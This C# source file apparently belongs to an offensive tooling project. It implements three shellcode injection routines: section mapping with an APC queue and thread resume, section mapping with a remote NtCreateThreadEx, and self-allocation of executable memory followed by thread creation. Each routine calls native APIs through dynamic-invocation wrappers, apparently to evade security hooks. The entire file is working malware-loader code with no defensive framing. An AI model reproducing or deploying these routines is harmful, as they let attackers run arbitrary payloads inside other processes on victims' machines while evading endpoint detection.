using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static DynamicEngLoading.h_DynInv.Win32;

namespace DynamicEngLoading
{
    public unsafe class Inj_techs
    {
        public static bool MapViewAPCResumeThread(byte[] shellcode, IntPtr hProcess, IntPtr hThread)
        {
            try
            {
                var hSection = IntPtr.Zero;
                var maxSize = (ulong)shellcode.Length;

                // dinvoke nt create section      
                h_DynInv_Methods.NtFuncWrapper.NtCreateSection(ref hSection, (uint)0x10000000, IntPtr.Zero, ref maxSize, (uint)0x40, (uint)0x08000000, IntPtr.Zero);
                //hSection = (IntPtr)createSectionParameters[0];

                // dinvoke map view of section local
                IntPtr localBaseAddress = new IntPtr();
                ulong viewSize = new ulong();
                h_DynInv_Methods.NtFuncWrapper.NtMapViewOfSection(hSection, Process.GetCurrentProcess().Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize, (uint)2, (uint)0, (uint)0x04);
                //localBaseAddress = (IntPtr)mapViewParameters[2];

                // writeProcessMemory locally so we can map it to target after
                GCHandle pinnedBuffer = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
                IntPtr p_buffer = pinnedBuffer.AddrOfPinnedObject();
                var num_bytes_written = h_DynInv_Methods.NtFuncWrapper.NtWriteVirtualMemory(Process.GetCurrentProcess().Handle, localBaseAddress, p_buffer, (uint)shellcode.Length);

                // dinvoke map view of section remote which basically copies shellcode
                IntPtr remoteBaseAddress = new IntPtr();
                h_DynInv_Methods.NtFuncWrapper.NtMapViewOfSection(hSection, hProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize, (uint)2, (uint)0, (uint)0x20);

                // Queue user APC
                //h_DynInv_Methods.Ker32FuncWrapper.QueueUserAPC(remoteBaseAddress, hThread, (uint)0);
                h_DynInv_Methods.NtFuncWrapper.NtQueueApcThread(hThread, remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                // resume thread to activate 
                var resumeThreadnParameters = new object[] { hThread };
                //var createThreadResult = h_DynInv_Methods.Ker32FuncWrapper.ResumeThread(hThread);
                uint suspendCount;
                var createThreadResult = h_DynInv_Methods.NtFuncWrapper.NtResumeThread(hThread, out suspendCount);

                //ntUnmapViewOfSection
                //h_DynInv_Methods.NtFuncWrapper.NtUnmapViewOfSection(hSection, localBaseAddress);

                pinnedBuffer.Free();
                if (createThreadResult)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
                return false;
            }
        }

        public static bool MapViewCreateThread(byte[] shellcode, IntPtr hProcess)
        {


            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // dinvoke nt create section      
            h_DynInv_Methods.NtFuncWrapper.NtCreateSection(ref hSection, (uint)0x10000000, IntPtr.Zero, ref maxSize, (uint)0x40, (uint)0x08000000, IntPtr.Zero);
            //hSection = (IntPtr)createSectionParameters[0];

            // dinvoke map view of section local
            IntPtr localBaseAddress = new IntPtr();
            ulong viewSize = new ulong();
            h_DynInv_Methods.NtFuncWrapper.NtMapViewOfSection(hSection, Process.GetCurrentProcess().Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize, (uint)2, (uint)0, (uint)0x04);
            //localBaseAddress = (IntPtr)mapViewParameters[2];

            // writeProcessMemory locally so we can map it to target after
            GCHandle pinnedBuffer = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr p_buffer = pinnedBuffer.AddrOfPinnedObject();
            var num_bytes_written = h_DynInv_Methods.NtFuncWrapper.NtWriteVirtualMemory(Process.GetCurrentProcess().Handle, localBaseAddress, p_buffer, (uint)shellcode.Length);

            // dinvoke map view of section remote which basically copies shellcode
            IntPtr remoteBaseAddress = new IntPtr();
            IntPtr hRemoteThread = IntPtr.Zero;
            h_DynInv_Methods.NtFuncWrapper.NtMapViewOfSection(hSection, hProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSize, (uint)2, (uint)0, (uint)0x20);

            //Console.WriteLine($"Mapped view to target");
            var createThreadResult = h_DynInv_Methods.NtFuncWrapper.NtCreateThreadEx(ref hRemoteThread, WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero, hProcess, remoteBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            pinnedBuffer.Free();
            if (createThreadResult == h_DynInv.NTSTATUS.Success)
            {
                return true;
            }
            return false;
        }

        //simple create thread injection 
        public static bool SelfAllocCreateThread(byte[] shellcode)
        {
            //ntAllocateVirtualMemory
            var allocLocation = h_DynInv_Methods.NtFuncWrapper.NtAllocateVirtualMemory(new IntPtr(-1), shellcode.Length, Kernel32.AllocationType.Commit, (uint)Kernel32.MemoryProtection.ExecuteReadWrite);
            //write shellcode to alloc location
            //pointer to shellcode
            GCHandle pinnedBuffer = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
            IntPtr p_buffer = pinnedBuffer.AddrOfPinnedObject();
            h_DynInv_Methods.NtFuncWrapper.NtWriteVirtualMemory(Process.GetCurrentProcess().Handle, allocLocation, p_buffer, (uint)shellcode.Length);
            //create thread
            IntPtr hThread = IntPtr.Zero;
            var createThreadResult = h_DynInv_Methods.NtFuncWrapper.NtCreateThreadEx(ref hThread, WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero, Process.GetCurrentProcess().Handle, allocLocation, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            pinnedBuffer.Free();
            if (createThreadResult == h_DynInv.NTSTATUS.Success)
            {
                return true;
            }
            return false;
        }
    }
}
